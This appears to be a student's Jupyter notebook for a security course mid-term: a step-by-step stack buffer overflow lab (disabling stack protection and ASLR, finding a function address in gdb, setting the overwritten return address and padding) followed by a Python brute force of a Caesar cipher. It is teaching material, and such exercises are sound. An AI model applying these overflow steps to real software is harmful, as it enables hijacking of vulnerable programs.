{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Mid-term Assignment \n",
    "Leon Debnath i6252320\n",
    "\n",
    "## Part 1 - Buffer Overflow\n",
    "\n",
    "### 1.a. Compile\n",
    "`$ gcc -fno-stack-protector -z execstack -g assignment.c -o assignment`\n",
    "\n",
    "### 1.b. Disable ASLR\n",
    "`$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`\n",
    "\n",
    "### 1.c. Debug code\n",
    "`$ gdb assignment -tui`\n",
    "\n",
    "### 1.d. Find Memory Address\n",
    "Run the code in the debugger\n",
    "\n",
    "`(gbd) run`\n",
    "\n",
    "Set a breakpoint at main\n",
    "\n",
    "`(gdb) break main`\n",
    "\n",
    "Run the code until the breakpoint\n",
    "\n",
    "`(gbd) run`\n",
    "\n",
    "Find the address of the \"print_secret_message\" function\n",
    "\n",
    "`(gbd) info address print_secret_message\n",
    " (gbd) Symbol \"print_secret_message\" is a function at address 0x5555555552db`\n",
    " \n",
    "### 1.d. Modify the Exploit\n",
    "Change the EIP variable to the memory address found above\n",
    "\n",
    "`unsigned long long EIP = 0x5555555552d5;`\n",
    "\n",
    "Edit the buffer size to be 256 bytes plus the 8 Byte header\n",
    "\n",
    "`for(i = 0; i < 264; i++)\n",
    "\tfwrite(&x, 1, 1, stdout);`\n",
    "    \n",
    "Compile exploit.c\n",
    "\n",
    "`$ gcc exploit.c -o exploit`\n",
    "    \n",
    "### 1.e. Execute the exploit\n",
    "Executing the exploit by piping the assignment to the exploit reveals the encrypted secret message \n",
    "`$ ./exploit | ./assignment`\n",
    "\n",
    "`$ Enter the secret passphrase that will decrypt the secret message: OLZLJYLATLZZHNLPZHNYLLHISLULZZLZ`\n",
    "\n",
    "## 2.a Decryption\n",
    "The encryption is know to be a Ceasar Cypher, a mono-alphabetic encryption with a single shift value for each letter in the alphabet.  Given that all letters are uppercase with no spaces, we can safely assume that white space has been removed and the message is case insensitive.  We can form an ordered alphabet and brute force the encryption with 26 combinations. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "letters = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']\n",
    "alphabet = {}\n",
    "\n",
    "for i in range(len(letters)):\n",
    "    alphabet[letters[i]] = i\n",
    "\n",
    "\n",
    "def get_letter(char: str, rotation: int):\n",
    "\"\"\"\n",
    "Swap a letter with a given number of rotations, use of the modulo\n",
    "operator means that rotations that take the index outside of 25 \n",
    "will wrap round to the beginning again.\n",
    "\"\"\"\n",
    "    index = alphabet[char]\n",
    "    index += rotation\n",
    "    return letters[index % len(letters)]\n",
    "\n",
    "\n",
    "def decrypt(in_str: str, rotation: int):\n",
    "\"\"\"\n",
    "Decrypt can be used for both encryption and decryption of the \n",
    "cypher, with a negative rotation encrypting the plaintext as \n",
    "long as the absolute value is the same.\n",
    "\"\"\"\n",
    "    out_str = ''\n",
    "    for char in in_str:\n",
    "        out_str += get_letter(char, rotation)\n",
    "        \n",
    "    return out_str"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The brute force approach provides 26 different combinations, which is small enough to manually check."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0: OLZLJYLATLZZHNLPZHNYLLHISLULZZLZ\n",
      "1: PMAMKZMBUMAAIOMQAIOZMMIJTMVMAAMA\n",
      "2: QNBNLANCVNBBJPNRBJPANNJKUNWNBBNB\n",
      "3: ROCOMBODWOCCKQOSCKQBOOKLVOXOCCOC\n",
      "4: SPDPNCPEXPDDLRPTDLRCPPLMWPYPDDPD\n",
      "5: TQEQODQFYQEEMSQUEMSDQQMNXQZQEEQE\n",
      "6: URFRPERGZRFFNTRVFNTERRNOYRARFFRF\n",
      "7: VSGSQFSHASGGOUSWGOUFSSOPZSBSGGSG\n",
      "8: WTHTRGTIBTHHPVTXHPVGTTPQATCTHHTH\n",
      "9: XUIUSHUJCUIIQWUYIQWHUUQRBUDUIIUI\n",
      "10: YVJVTIVKDVJJRXVZJRXIVVRSCVEVJJVJ\n",
      "11: ZWKWUJWLEWKKSYWAKSYJWWSTDWFWKKWK\n",
      "12: AXLXVKXMFXLLTZXBLTZKXXTUEXGXLLXL\n",
      "13: BYMYWLYNGYMMUAYCMUALYYUVFYHYMMYM\n",
      "14: CZNZXMZOHZNNVBZDNVBMZZVWGZIZNNZN\n",
      "15: DAOAYNAPIAOOWCAEOWCNAAWXHAJAOOAO\n",
      "16: EBPBZOBQJBPPXDBFPXDOBBXYIBKBPPBP\n",
      "17: FCQCAPCRKCQQYECGQYEPCCYZJCLCQQCQ\n",
      "18: GDRDBQDSLDRRZFDHRZFQDDZAKDMDRRDR\n",
      "19: HESECRETMESSAGEISAGREEABLENESSES\n",
      "20: IFTFDSFUNFTTBHFJTBHSFFBCMFOFTTFT\n",
      "21: JGUGETGVOGUUCIGKUCITGGCDNGPGUUGU\n",
      "22: KHVHFUHWPHVVDJHLVDJUHHDEOHQHVVHV\n",
      "23: LIWIGVIXQIWWEKIMWEKVIIEFPIRIWWIW\n",
      "24: MJXJHWJYRJXXFLJNXFLWJJFGQJSJXXJX\n",
      "25: NKYKIXKZSKYYGMKOYGMXKKGHRKTKYYKY\n"
     ]
    }
   ],
   "source": [
    "data = 'OLZLJYLATLZZHNLPZHNYLLHISLULZZLZ'\n",
    "\n",
    "outputs = {}\n",
    "\n",
    "for i in range(len(letters)):\n",
    "    outputs[i] = decrypt(data, i)\n",
    "    print(f\"{i}: {outputs[i]}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HESECRETMESSAGEISAGREEABLENESSES\n"
     ]
    }
   ],
   "source": [
    "print(outputs[19])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
